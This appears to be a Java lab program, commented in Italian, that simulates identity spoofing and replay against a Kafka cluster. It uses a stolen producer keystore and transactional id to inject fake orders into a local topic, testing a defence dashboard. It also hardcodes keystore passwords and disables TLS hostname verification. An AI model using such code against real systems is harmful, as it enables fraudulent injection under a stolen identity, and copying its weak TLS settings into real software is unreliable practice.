package org.example.Sicurezza.SimulazioneAttacchi;

import org.apache.kafka.clients.producer.KafkaProducer;
import org.apache.kafka.clients.producer.ProducerConfig;
import org.apache.kafka.clients.producer.ProducerRecord;
import org.apache.kafka.common.serialization.StringSerializer;

import java.util.Properties;

/**
 * FullAccessAttacker - Identity Spoofing e Replay Attack.
 *
 * <p>Simula un attaccante che ha sottratto il keystore del producer legittimo
 * ({@code sicurezza/certs/OrderProducer.keystore.jks}) e il suo transactional id
 * ({@code prod-order-01}). Per il broker l'attaccante è indistinguibile dal
 * producer legittimo: stessa identità mTLS, stesso transactional id.
 *
 * <p><b>Comportamento atteso:</b>
 * <ul>
 *   <li>il producer legittimo ha già inviato i seq 1..N nella sessione della dashboard;</li>
 *   <li>l'attaccante parte da seq 1, che la dashboard ha già visto;</li>
 *   <li>la dashboard rileva {@code REPLAY ATTACK DETECTED} e applica un DENY su {@code OrderProducer};</li>
 *   <li>il successivo invio dell'attaccante fallisce con {@code TopicAuthorizationException}.</li>
 * </ul>
 *
 * <p><b>Effetto collaterale:</b> il DENY colpisce l'identità del certificato, non il processo.
 * Anche il producer legittimo non può più scrivere finché non viene eseguito
 * RESTORE PERMISSIONS nella dashboard. È un limite della difesa basata sull'identità:
 * la revoca non distingue chi ha inviato il messaggio.
 *
 * <p><b>Prerequisiti:</b>
 * <ul>
 *   <li>dashboard avviata, con {@code Baseline ALLOW rules applied successfully};</li>
 *   <li>ACL sul transactional id {@code prod-order-01} per {@code OrderProducer} (Write, Describe);</li>
 *   <li>nessun DENY attivo su {@code OrderProducer} all'avvio.</li>
 * </ul>
 *
 * @see org.example.Sicurezza.EnterpriseDefenseConsole
 */
public class FullAccessAttacker {

    /** Broker raggiungibili dal PC tramite le porte esposte da Docker. */
    private static final String KAFKA_BROKERS = "localhost:9093,localhost:9095,localhost:9096";

    /** Topic protetto monitorato dalla dashboard. */
    private static final String TARGET_TOPIC = "secure-orders";

    /** Transactional id del producer legittimo, sottratto insieme al certificato. */
    private static final String SPOOFED_TX_ID = "prod-order-01";

    /**
     * Avvia l'attacco: inizializza le transazioni e invia un messaggio ogni 2 secondi
     * con seq crescente a partire da 1.
     *
     * <p>Il programma termina quando un invio viene respinto dal broker. L'eccezione
     * reale viene stampata su {@code System.err}.
     *
     * @param args non utilizzato
     */
    public static void main(String[] args) {
        System.setProperty("org.slf4j.simpleLogger.defaultLogLevel", "warn");

        System.out.println("\n========================================================");
        System.out.println("       ATTACK VECTOR - IDENTITY SPOOFING ACTIVE         ");
        System.out.println("========================================================");
        System.out.println("[SIMULATORE] Tattica: Replay Attack & Sequence Prediction");

        Properties connectionProps = buildConfiguration();

        try (KafkaProducer<String, String> spoofedProducer = new KafkaProducer<>(connectionProps)) {
            // Inizializza le transazioni: richiede l'ACL Write/Describe sul transactional id
            spoofedProducer.initTransactions();
            System.out.println("[SIMULATORE] Transazioni inizializzate. Avvio iniezione...");

            long sequenceCounter = 1L;

            while (true) {
                spoofedProducer.beginTransaction();

                String fakeOrderId = "FRAUD-ORD-ID-" + sequenceCounter;

                // Payload compatibile con i controlli della dashboard:
                // ordine_id (presenza), seq (replay), stato (presenza)
                String payloadJson = String.format(
                        "{\"ordine_id\":%d, \"seq\":%d, \"articolo\":\"%s\", \"stato\":\"COMPLETED\"}",
                        sequenceCounter, sequenceCounter, fakeOrderId);

                ProducerRecord<String, String> messageRecord =
                        new ProducerRecord<>(TARGET_TOPIC, fakeOrderId, payloadJson);

                // Il broker vede solo il certificato: non distingue il producer legittimo
                // dall'attaccante. Se la dashboard applica il DENY, questo invio fallisce
                // con TopicAuthorizationException, e il producer legittimo è bloccato allo stesso modo.
                spoofedProducer.send(messageRecord).get();
                spoofedProducer.commitTransaction();

                System.out.println("[CLONAZIONE] Ordine contraffatto iniettato | Seq: " + sequenceCounter);
                sequenceCounter++;

                Thread.sleep(2000);
            }
        } catch (Exception ex) {
            System.err.println("\n[INTERROTTO] Trasmissione terminata.");
            System.err.println("Dettaglio: " + ex.getClass().getSimpleName() + " - " + ex.getMessage());
        }
    }

    /**
     * Costruisce la configurazione del producer fraudolento.
     *
     * <p>Replica la configurazione EOS del producer legittimo (transactional id,
     * idempotenza, acks=all) e usa il keystore sottratto per l'autenticazione mTLS.
     * Il truststore è quello comune del cluster, quindi il client accetta solo
     * broker firmati dalla CA {@code Kafka-CA}.
     *
     * @return proprietà pronte per {@link KafkaProducer}
     */
    private static Properties buildConfiguration() {
        Properties properties = new Properties();
        properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, KAFKA_BROKERS);
        properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());
        properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());

        // Configurazione EOS identica al producer legittimo
        properties.put(ProducerConfig.TRANSACTIONAL_ID_CONFIG, SPOOFED_TX_ID);
        properties.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, "true");
        properties.put(ProducerConfig.ACKS_CONFIG, "all");

        // mTLS con keystore sottratto
        properties.put("security.protocol", "SSL");
        properties.put("ssl.truststore.location", "sicurezza/certs/kafka.truststore.jks");
        properties.put("ssl.truststore.password", "KafkaSecurePass123");
        properties.put("ssl.keystore.location", "sicurezza/certs/OrderProducer.keystore.jks");
        properties.put("ssl.keystore.password", "KafkaSecurePass123");
        properties.put("ssl.key.password", "KafkaSecurePass123");
        properties.put("ssl.endpoint.identification.algorithm", "");

        return properties;
    }
}